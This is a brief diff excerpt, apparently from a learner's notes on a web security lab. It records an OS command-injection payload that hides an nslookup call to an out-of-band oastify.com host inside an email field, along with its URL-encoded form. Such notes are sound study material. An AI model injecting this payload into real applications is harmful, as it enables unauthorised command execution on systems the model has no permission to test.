@@ -11,4 +11,3 @@ exploit@exploit.com & nslookup 4x2b9ii83cgxez6wrybgw4x6fxlo9ex3.oastify.com #
 url encoded it with crl+u
 
 exploit%40exploit.com+%26+nslookup+4x2b9ii83cgxez6wrybgw4x6fxlo9ex3.oastify.com+%23
-
